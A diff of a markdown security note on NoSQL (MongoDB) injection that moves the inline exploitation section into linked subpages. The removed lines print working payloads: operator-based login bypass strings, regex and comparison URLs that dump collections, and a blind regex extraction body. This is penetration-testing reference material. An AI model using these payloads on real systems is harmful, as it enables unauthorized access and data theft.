@@ -1,10 +1,14 @@
 # NoSQL Injection
 
-## Overview
+## What is NoSQL Injection?
 
 NoSQL databases (such as MongoDB) use query languages and data models that differ from traditional SQL. Injection vulnerabilities arise when user input is used unsafely in database queries, often through operators that can alter the intended logic of the query (e.g., `$ne`, `$gt`, `$regex`).
 
-These can allow authentication bypass, data exfiltration, and other unauthorized operations without traditional SQL syntax.
+## Exploits
+
+- [Operator-based Authentication Bypass](nosql-injection/operator-bypass.md)
+- [In-Band Data Extraction](nosql-injection/inband-extraction.md)
+- [Blind Data Extraction](nosql-injection/blind-extraction.md)
 
 ## Attack Surface
 
@@ -18,64 +22,6 @@ These can allow authentication bypass, data exfiltration, and other unauthorized
 - Look for differences in responses when using comparison or logical operators.
 - Test authentication forms with operators that should return unexpected results (e.g., matching any document).
 - Use regex or other evaluation operators to perform blind or in-band data extraction.
-
-## Exploitation
-
-### MongoDB Basics and Operators
-
-Common comparison and logical operators:
-- `$ne` : not equal
-- `$gt`, `$gte`, `$lt`, `$lte` : greater/less than comparisons
-- `$in`, `$nin` : in/not in arrays
-- `$regex` : regular expression matching
-- `$where` : JavaScript expression evaluation (powerful but dangerous)
-
-Example queries:
-```javascript
-db.apples.find({
-    $and: [
-        { type: { $regex: /^G/ } },
-        { price: { $lt: 0.70 } }
-    ]
-});
-```
-
-### Authentication Bypass
-
-Common patterns (often sent as form data or JSON):
-```
-email[$ne]=test@test.com&password[$ne]=test
-email[$regex]=.*&email[$regex]=.*
-email=admin@example.com&password[$ne]=x
-email[$gt]=&password[$gt]=
-```
-
-When email is known:
-```
-email=admin%40example.com&password[$ne]=x
-```
-
-### In-Band Data Extraction
-
-Return entire collections or documents:
-```
-http://target/?q[$regex]=.*
-http://target/?q[$ne]='doesntExist'
-http://target/?q[$gt]=''
-```
-
-### Blind Data Extraction
-
-Use `$regex` for character-by-character extraction by observing response differences:
-```json
-{
-    "trackingNum": {
-        "$regex": "^3.*"
-    }
-}
-```
-
-Continue refining the regex to extract data one character at a time.
 
 ## Impact
 
